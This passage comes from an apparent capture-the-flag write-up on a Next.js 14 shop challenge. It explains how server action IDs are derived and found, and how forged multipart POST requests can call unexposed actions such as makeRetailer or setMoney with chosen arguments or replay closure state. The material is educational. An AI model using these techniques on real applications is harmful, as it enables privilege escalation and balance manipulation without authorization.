  <span class="token attr-name">action</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token string">'use server'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span>retailer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">removeItem</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">setMoney</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>money <span class="token operator">+</span> item<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/items?error=Only retailers can sell items'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span>
<span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-danger<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    Sell
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code><!-- HTML_TAG_END --></pre>
<p>Looking around the source code further, we find that the only code path to set a user’s retailer role is through the server action <code>makeRetailer()</code>. Interestingly, same with the code for registration, this function is unused and not called anywhere either. It is also important to note that this function does not have any validation whatsoever other than that the user is checked to be authenticated.</p>
<pre class="language-ts"><!-- HTML_TAG_START --><code class="language-ts"><span class="token comment">// app/db.ts</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">makeRetailer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">boolean</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">'UPDATE users SET retailer = ? WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token boolean">true</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>Assuming we can register a user and set ourselves as a retailer, having access to both buy and sell functionalities, we still need a way to increase our balance beyond the initial 100 to afford the EPT tote bag containing the flag.
Taking inspiration from the other challenges in the same series, revisiting the buy and sell methods may reveal a way to achieve this.</p>
<p>In summary, from the analysis, we can figure that the first obstacle is to register a user. Once registered, the next step is to find a way to call the exported server actions such as <code>makeRetailer</code> or similarly, <code>addItem</code> or <code>setMoney</code>. These actions could enable the selling functionality or directly add the item containing the flag to our inventory. Alternatively, if these actions are not accessible but we still somehow can become a retailer, exploiting the buy/sell logic to increase our balance could provide the money we need to net us the flag as well.</p>
<h2 id="understanding-nextjs-14-server-actions"><a href="#understanding-nextjs-14-server-actions">Understanding Next.js 14 server actions</a></h2>
<p>But before diving into exploiting the application, let’s take a look at Next.js server actions and the underlying magic as in how they work first. Note that since the challenge application runs on Next.js 14.2.15, much of what is discovered below may only apply specifically to this version.</p>
<p>Before we start, a high-level understanding of what Server Actions are and how they can be used can be seen and outlined in the <a href="https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations" rel="noopener" class="text-link" target="_blank">Next.js documentation</a>. The following are some snippets taken directly from it:</p>
<blockquote><p>Server Actions in Next.js are asynchronous functions that are executed on the server. They can be called in Server and Client Components to handle form submissions and data mutations in Next.js applications.</p>
<p>A Server Action can be defined with the React “use server” directive. You can place the directive at the top of an async function to mark the function as a Server Action, or at the top of a separate file to mark all exports of that file as Server Actions.</p></blockquote>
<p>With that in mind, let’s explore the technical details of how they work :)</p>
<h3 id="server-action-ids"><a href="#server-action-ids">Server Action IDs</a></h3>
<p>In Next.js 14, when defining a Server Action, Next.js generates a unique “Action ID” for it. This ID is a hash calculated based on the action’s specific location in the codebase and its contents it seems. This approach makes the IDs deterministic if the source code is available, meaning we can deduce or retrieve these IDs if we have the code (which we fortunately do in this case).</p>
<p>It is important to note that this process has changed in Next.js 15 though. It is stated that <code>&quot;Next.js now creates unguessable, non-deterministic IDs to allow the client to reference and call the Server Action. These IDs are periodically recalculated between builds for enhanced security&quot;</code>. This specific change can be read in the following article: <a href="https://nextjs.org/blog/next-15#enhanced-security-for-server-actions" rel="noopener" class="text-link" target="_blank">https://nextjs.org/blog/next-15#enhanced-security-for-server-actions</a></p>
<p>Anyway, from my understanding, here’s a summary of how Action IDs work for Next.js 14 based on reading several docs:</p>
<ul class="list"><li>When the application builds, Next.js analyzes all defined Server Actions and generates a unique ID for each one.</li>
<li>The process of generating the IDs is very dependent on the action’s location as well as its contents, making the ID specific to the code structure and function details, such as parameters and arguments. This will be further mentioned later.<ul class="list"><li>It is, therefore, important to note that changes in these factors will alter the ID</li></ul></li>
<li>When client-side components use Server Actions, instead of having access to the actual function directly, a reference that includes this action ID will be bundled within the client code.<ul class="list"><li>This way, it is theoretically possible to leak and expose all Server Actions placed in the same file as the action the client uses. However, this challenge application is not susceptible to this as most components use SSR.</li></ul></li>
<li>A configuration file placed at <code>./.next/server/server-reference-manifest.json</code> is also generated during the build process, containing details about all Server Actions. This file includes:<ul class="list"><li>All Server Action IDs (as JSON keys) in whole the application</li>
<li>Specific server workers (at specific page/endpoints) designated to handle each Server Action</li>
<li>An encryption key used for Server Action closures. This will also be mentioned later regarding invocating Server Actions.</li></ul></li></ul>
<p>The configuration structure might look something like this:</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">&#123;
  &quot;node&quot;: &#123;
    &quot;e55288980c2aa166e63d652496ef4cb5a59fe71b&quot;: &#123;
      &quot;workers&quot;: &#123;
        &quot;app/_not-found/page&quot;: &quot;3641&quot;,
        &quot;app/page&quot;: &quot;6853&quot;,
        &quot;app/items/page&quot;: &quot;7058&quot;,
        &quot;app/register/page&quot;: &quot;6770&quot;,
        &quot;app/login/page&quot;: &quot;1354&quot;
      &#125;,
      &quot;layer&quot;: &#123;
        &quot;app/_not-found/page&quot;: &quot;rsc&quot;,
        &quot;app/page&quot;: &quot;rsc&quot;,
        &quot;app/items/page&quot;: &quot;rsc&quot;,
        &quot;app/register/page&quot;: &quot;rsc&quot;,
        &quot;app/login/page&quot;: &quot;rsc&quot;
      &#125;
    &#125;,
    &quot;73e81bf6d2f360e2dbcca467b38d6d3485416a80&quot;: &#123;
      &quot;workers&quot;: &#123;
        &quot;app/login/page&quot;: &quot;1354&quot;
      &#125;,
      &quot;layer&quot;: &#123;
        &quot;app/login/page&quot;: &quot;rsc&quot;
      &#125;
    &#125;
  &#125;,
  &quot;edge&quot;: &#123;&#125;,
  &quot;encryptionKey&quot;: &quot;mJAPusl5apVZ8FEgO0pOxHh/c8gRvX1ZVIzcV+y7WtE=&quot;
&#125;</code><!-- HTML_TAG_END --></pre>
<h3 id="invocation-and-client-requests"><a href="#invocation-and-client-requests">Invocation and client requests</a></h3>
<p>With the Action ID in place, let’s take a look at the various ways a client can invoke or call these server actions in Next.js, depending on how they’re defined. Note that access to the Action ID presented above is essential for any invocation, as it uniquely identifies each Server Action in the client-to-server communication.</p>
<h4 id="forms"><a href="#forms">Forms</a></h4>
<p>According to the Next.js documentation, the main way to use Server Actions is via an HTML <code>&lt;form&gt;</code> element with the <code>action</code> prop. When the form is submitted, Next.js automatically sends the data using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/FormData" rel="noopener" class="text-link" target="_blank">FormData Web API</a>, allowing the action to handle and extract data from the form fields through a FormData object. More details on its usage can be found here: <a href="https://nextjs.org/docs/14/app/building-your-application/data-fetching/server-actions-and-mutations#forms" rel="noopener" class="text-link" target="_blank">https://nextjs.org/docs/14/app/building-your-application/data-fetching/server-actions-and-mutations#forms</a></p>
<p>An important note is that when invoked this way, the Server Action must either strictly accept only FormData as its first parameter or none at all. This constraint ensures that data can be handled correctly when passed via the form submission.</p>
<p>For example, we could define an action like this:</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token string">'use server'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">loginUser</span><span class="token punctuation">(</span>formData<span class="token operator">:</span> FormData<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> username <span class="token operator">=</span> formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> password <span class="token operator">=</span> formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  <span class="token comment">// Process the form data</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">Login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span>loginUser<span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Login</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>or alternatively, with no parameters:</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token string">'use server'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">loginUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// Process the form data</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">Login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span>loginUser<span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Login</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>When called by the client, this action will initiate a <code>POST</code> request with a <code>Content-Type</code> of <code>multipart/form-data</code> to the server. A typical request for this might look like the following:</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST /login HTTP/2
Host: www.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryToyTbSR91Ei4Fmrd
Content-Length: XXX

------WebKitFormBoundaryToyTbSR91Ei4Fmrd
Content-Disposition: form-data; name=&quot;$ACTION_ID_674d520b41ccc6f326424b41b57befe8f5ca78e4&quot;


------WebKitFormBoundaryToyTbSR91Ei4Fmrd
Content-Disposition: form-data; name=&quot;username&quot;

Shirajuki
------WebKitFormBoundaryToyTbSR91Ei4Fmrd
Content-Disposition: form-data; name=&quot;password&quot;

asdzxc123
------WebKitFormBoundaryToyTbSR91Ei4Fmrd--</code><!-- HTML_TAG_END --></pre>
<p>In the context of this challenge application, this means that the server actions defined in <code>app/actions.ts</code>, including <code>loginUser(formData: FormData)</code> and <code>registerUser(formData: FormData)</code>, should be accessible to us if we obtain their respective Action IDs. Similarly, the <code>makeRetailer()</code> function in <code>app/db.ts</code> would also be accessible under the same conditions.</p>
<p>To obtain these Action IDs, we have a couple of options:</p>
<ul class="list"><li><p><strong>Local Setup with Request Interception:</strong> By setting up a local instance of the application and making sure no modifications are done to the <code>app/actions.ts</code> and <code>app/db.ts</code> files respectively, we can simulate calls to these actions if imported and used in any component. Intercepting the network requests during this process will expose the Action IDs in the request payload.</p></li>
<li><p><strong>Local Setup with Client-side components:</strong> Similarily, by setting up a local instance of the application and then using the server actions in client-side components. The Action IDs will be included in the bundled client code as mentioned above in my summary of how Action ID works.</p></li>
<li><p><strong>Extracting from the Server Reference Manifest:</strong> Alternatively, we can pull the Action IDs directly from the generated configuration file (<code>./next/server/server-reference-manifest.json</code>) after setting up an instance locally. This file contains all the Action IDs alongside their associated paths.</p></li></ul>
<p>With the Action IDs in hand, we should be able to invoke these server actions as though they were public endpoints. Thus, registration of users and giving the user the retailer role should be possible for us to exploit.</p>
<h4 id="forms-alongside-method-binding"><a href="#forms-alongside-method-binding">Forms alongside method binding</a></h4>
<p>In addition to just simply passing in FormData as a parameter, one can also pass in additional arguments to a Server Action using the <code>bind</code> method as described here: <a href="https://nextjs.org/docs/14/app/building-your-application/data-fetching/server-actions-and-mutations#passing-additional-arguments" rel="noopener" class="text-link" target="_blank">https://nextjs.org/docs/14/app/building-your-application/data-fetching/server-actions-and-mutations#passing-additional-arguments</a></p>
<p>For example, we can define and structure an action like this below:</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token string">'use server'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> User <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'../db'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">setMoney</span><span class="token punctuation">(</span>amount<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">,</span> formData<span class="token operator">:</span> FormData<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> amount <span class="token operator">=</span> formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'amount'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">number</span><span class="token punctuation">;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">Update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token function">setMoney</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>amount<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Motherlode</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>Or alternatively, with no FormData at all:</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token string">'use server'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> User <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'../db'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">setMoney</span><span class="token punctuation">(</span>amount<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">Update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token function">setMoney</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Motherlode</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The request can then look something like the following:</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST / HTTP/2
Host: www.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2ZnBVfhv1G12CmqK
Content-Length: XXX

------WebKitFormBoundary2ZnBVfhv1G12CmqK
Content-Disposition: form-data; name=&quot;$ACTION_REF_2&quot;


------WebKitFormBoundary2ZnBVfhv1G12CmqK
Content-Disposition: form-data; name=&quot;$ACTION_2:0&quot;

&#123;&quot;id&quot;:&quot;5033aa9e8e719350ff01f9a353595d64a7488812&quot;,&quot;bound&quot;:&quot;$@1&quot;&#125;
------WebKitFormBoundary2ZnBVfhv1G12CmqK
Content-Disposition: form-data; name=&quot;$ACTION_2:1&quot;

[10000]
------WebKitFormBoundary2ZnBVfhv1G12CmqK--</code><!-- HTML_TAG_END --></pre>
<p>With this structure and way of invoking the server action, one could theoretically call any Server Action with arbitrary parameters given that the Action ID is known. It is noted that the limit in this case is that the arguments given should be serializable as stated here: <a href="https://react.dev/reference/rsc/use-server#serializable-parameters-and-return-values" rel="noopener" class="text-link" target="_blank">https://react.dev/reference/rsc/use-server#serializable-parameters-and-return-values</a></p>
<h4 id="forms-alongside-closures"><a href="#forms-alongside-closures">Forms alongside closures</a></h4>
<p>Finally, another way to structure a Server Action is by defining it directly within a component, creating what’s known as a closure. This method associates the action with a snapshot of the data state at the time of rendering, so any arguments required by the action are serialized and included in the request itself.</p>
<p>However, to protect sensitive data from being exposed to the client within these serialized snapshots, Next.js encrypts the data using a unique encryption key generated at each build. This encryption ensures that closure-based actions can only be invoked within the specific build context they were generated for, adding a layer of security by binding them to that build. For further details, Next.js provides a helpful overview here: <a href="https://nextjs.org/blog/security-nextjs-server-components-actions#closures" rel="noopener" class="text-link" target="_blank">https://nextjs.org/blog/security-nextjs-server-components-actions#closures</a></p>
<p>Like the above sections, here’s an example of how a closure could look like:</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token string">'use server'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> User<span class="token punctuation">,</span> Item <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'../db'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> redirect <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'next/navigation'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">removeItem</span><span class="token punctuation">(</span>itemName<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">setMoney</span><span class="token punctuation">(</span>amount<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">Sell</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> user<span class="token punctuation">,</span> item <span class="token punctuation">&#125;</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token keyword">readonly</span> user<span class="token operator">:</span> User <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token keyword">readonly</span> item<span class="token operator">:</span> Item <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
      <span class="token attr-name">action</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token string">'use server'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span>retailer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">removeItem</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">setMoney</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>money <span class="token operator">+</span> item<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
          <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/items?error=Only retailers can sell items'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span>
    <span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Sell</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The request against closures would look similar to request against the the bounded actions, but with the difference in that the argument are encrypted:</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST /items HTTP/2
Host: www.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUDUZv2eADcIFY6kH
Content-Length: XXX

------WebKitFormBoundaryUDUZv2eADcIFY6kH
Content-Disposition: form-data; name=&quot;$ACTION_REF_2&quot;


------WebKitFormBoundaryUDUZv2eADcIFY6kH
Content-Disposition: form-data; name=&quot;$ACTION_2:0&quot;

&#123;&quot;id&quot;:&quot;8096ba709448aa04f5b916405bc2620e6b7b1e0a&quot;,&quot;bound&quot;:&quot;$@1&quot;&#125;
------WebKitFormBoundaryUDUZv2eADcIFY6kH
Content-Disposition: form-data; name=&quot;$ACTION_2:1&quot;

[&quot;$@2&quot;]
------WebKitFormBoundaryUDUZv2eADcIFY6kH
Content-Disposition: form-data; name=&quot;$ACTION_2:2&quot;

&quot;dPs9K3zSEOjED8k17zAAaqeHQ0ESD/5+Mu+dPVpFDpRsB3x/8nbZzrocrbp1RIGtUCZ7W1SOtWdIUGEccTAWDt6KpNMQvp9CiCYdTrNWDZ/yU9Lhvs7T457Eh5FHtw9PvF4cxpUQsNDAVXk3h2+P&quot;
------WebKitFormBoundaryUDUZv2eADcIFY6kH--</code><!-- HTML_TAG_END --></pre>
<p>In the context of the challenge application, this makes closures a bit trickier to exploit since we can’t easily manipulate the argument values directly within the client.
However, since the data is serialized and the state snapshot is embedded within the request, any verification logic, like the if-check in <code>app/components/ItemCard.tsx</code>, is tightly linked to the state captured when the request is generated:</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token operator">&lt;</span>form
  action<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token string">'use server'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// The user's serialized state is saved in the request, meaning that this</span>
      <span class="token comment">// verification check runs on the same data even when replayed</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token operator">?.</span>money <span class="token operator">>=</span> item<span class="token punctuation">.</span>price<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">addItem</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setMoney</span><span class="token punctuation">(</span>user<span class="token operator">?.</span>money <span class="token operator">-</span> item<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>
